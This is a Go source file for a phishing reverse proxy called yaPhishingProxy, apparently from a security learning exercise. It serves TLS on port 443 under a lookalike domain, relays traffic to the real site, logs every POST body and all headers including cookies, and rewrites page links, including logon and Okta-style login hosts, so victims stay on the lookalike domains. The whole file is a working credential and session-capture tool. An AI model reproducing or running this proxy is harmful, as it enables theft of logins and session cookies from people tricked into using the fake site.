package main

/*
Setup the Environment

go env -w GOROOT="/usr/lib/go"
go env -w GOPATH="/home/thepcn3rd/go/workspaces/chapter3/yaPhishingProxy"

// To cross compile for linux
// GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -o yaPhishingProxy.bin -ldflags "-w -s" main.go

// To cross compile windows
// GOOS=windows GOARCH=amd64 go build -o yaPhishingProxy.exe -ldflags "-w -s" main.go

// Create the TLS keys for the https web server
// openssl genrsa -out server.key 2048
// openssl ecparam -genkey -name secp384r1 -out server.key
// openssl req -new -x509 -sha256 -key server.key -out server.crt -days 365

// Directory structure
// - yaReverseHTTPProxy.bin
// - keys/
// - - server.key
// - - server.crt


// References:
// https://www.youtube.com/watch?v=tWSmUsYLiE4
// https://dev.to/b0r/implement-reverse-proxy-in-gogolang-2cp4


*/

import (
	"bytes"
	"compress/gzip"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func checkError(reason string, err error) {
	if err != nil {
		fmt.Printf("%s...\n", reason)
		fmt.Printf("%s", err)
		os.Exit(0)
	}
}

func isFlagPassed(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func main() {
	//var err error
	// Without the below line the reverse proxy does not handle TLS correctly
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
	// Introduce command line flags to dynamically update the following:
	// - Destination URL
	// - Listening Port

	// Verify the destination server is available
	//dstURL := "https://www.example.internal"
	//dstServerURL, err := url.Parse(dstURL)
	//checkError("Unable to connect to destination URL", err)

	proxy := http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {

		//fmt.Println(w)
		var dstURL string
		//var dstServerURL *url.URL

		if strings.Contains(req.Host, "example.4gr8.info") {
			dstURL = "https://www.example.com" + req.RequestURI
		} else {
			fmt.Printf("\nUnproxied: %s%s\n\n", req.Host, req.RequestURI)
		}
		fmt.Printf("\n-------\nHost: %s%s\nProxied: %s\nMethod: %s\n-------\n", req.Host, req.RequestURI, dstURL, req.Method)

		var dstServerReq *http.Request
		var dstServerResponse *http.Response

		// Display the requests POST Body
		reqBodyBytes, err := io.ReadAll(req.Body)
		checkError("Unable to read response body", err)
		reqBodyString := string(reqBodyBytes)
		if req.Method == "POST" {
			fmt.Printf("\n--POST Request--\n%s\n--END POST Request---\n\n", reqBodyString)
		}
		if req.Method == "GET" {
			dstServerReq, err = http.NewRequest(req.Method, dstURL, nil)
			checkError("Unable to generate new requestto destination", err)
		} else {
			dstServerReq, err = http.NewRequest(req.Method, dstURL, bytes.NewBuffer(reqBodyBytes))
			checkError("Unable to generate new request to destination", err)
		}

		// Print the client side request headers and copy them to the destination server request
		fmt.Printf("\n\n-------\nClient Request Headers copied to Destination Server:\n-------\n")
		for key, values := range req.Header {
			for _, value := range values {
				fmt.Println(key + ": " + value)
				if key == "Referer" && strings.Contains(value, "example.4gr8.info") {
					//Note this is not URL Encoded
					value = strings.Replace(value, "https://example.4gr8.info", "https://www.example.com", -1)
					fmt.Printf("\n*** Modified the Referer header to: %s\n\n", value)
					dstServerReq.Header.Add(key, value)
				} else if key == "Cookie" && strings.Contains(value, "example.4gr8.info") {
					// Note the values of the cookie are URL Encoded
					fmt.Println("\n*** Evaluating the cookies and modifying them...")
					value = strings.Replace(value, "https%3A%2F%2Fexample.4gr8.info", "https%3A%2F%2Fwww.example.com", -1)
					fmt.Printf("Cookie after the change: %s\n\n", value)
					dstServerReq.Header.Add(key, value)
				} else {
					dstServerReq.Header.Add(key, value)
				}
			}
		}

		// Print the headers and copied to the destination server request
		fmt.Printf("\n\n-------\nDestination Request Headers:\n-------\n")
		for key, values := range dstServerReq.Header {
			for _, value := range values {
				fmt.Println(key + ": " + value)
				//dstServerReq.Header.Add(key, value)
				//w.Header().Set(key, value)
			}
		}

		dstServerResponse, err = http.DefaultClient.Do(dstServerReq)
		checkError("Unable to send request to destination", err)

		defer dstServerResponse.Body.Close()

		// Print the headers on the reverse proxy sidr
		// Copy the response headers to the client
		fmt.Printf("\n\n-------\nDestination Server Response Headers:\n-------\n")
		for key, values := range dstServerResponse.Header {
			for _, value := range values {
				fmt.Println(key + ": " + value)
				w.Header().Set(key, value)
			}
		}

		// Read the destination server response body
		// If the content-encoding is gzip then you need to decompress the body before reading it
		var responseReader io.ReadCloser
		switch dstServerResponse.Header.Get("Content-Encoding") {
		case "gzip":
			responseReader, err = gzip.NewReader(dstServerResponse.Body)
			defer responseReader.Close()
		default:
			responseReader = dstServerResponse.Body
		}

		bodyBytes, err := io.ReadAll(responseReader)
		checkError("Unable to read response body", err)
		//fmt.Printf("\n\n%s\n\n", bodyBytes)

		//bodyBytes, err := io.ReadAll(dstServerResponse.Body)
		//checkError("Unable to read response body", err)
		bodyString := string(bodyBytes[:])
		//fmt.Printf("\n\n%s\n\n", bodyString)

		// Modify the URLs to use the proxy server - Place the URLs in the hosts file
		bodyString = strings.Replace(bodyString, "www.example.com", "example.4gr8.info", -1)
		bodyString = strings.Replace(bodyString, "logon.example.com", "logon.4gr8.info", -1)
		bodyString = strings.Replace(bodyString, "example.com", "example.4gr8.info", -1)

		bodyString = strings.Replace(bodyString, "example.okta-clone.com", "okta-clone.4gr8.info", -1)

		// Only compress the response body if the header instructs the browser to do it
		// Some of the pictures do not go through if it is not structured this way
		var modifiedBodyBytes []byte
		switch dstServerResponse.Header.Get("Content-Encoding") {
		case "gzip":
			// Due to decompressing the response body from the server to change it, you need to recompress and pass to the client
			var b bytes.Buffer
			gz := gzip.NewWriter(&b)
			gz.Write([]byte(bodyString))
			gz.Close()
			bodyString = b.String()
			modifiedBodyBytes = []byte(bodyString)
		default:
			modifiedBodyBytes = []byte(bodyString)
		}

		w.Header().Set("Content-Length", fmt.Sprint(len(modifiedBodyBytes)))

		// Create a new reader to change the bytes to io.Reader
		readerBodyBytes := bytes.NewReader(modifiedBodyBytes)

		// Return the response to the client")

		// Return the response to the client
		//w.WriteHeader(http.StatusOK)
		//io.Copy(w, dstServerResponse.Body)
		//time.Sleep(time.Second * 2)
		w.WriteHeader(dstServerResponse.StatusCode)
		io.Copy(w, readerBodyBytes)
	})

	//httpsServer := "Yes"
	listeningPort := "443"
	//fmt.Print(httpsServer)
	//fmt.Print(listeningPort)
	log.Fatal(http.ListenAndServeTLS(":"+listeningPort, "./keys/server.crt", "./keys/server.key", proxy))

}
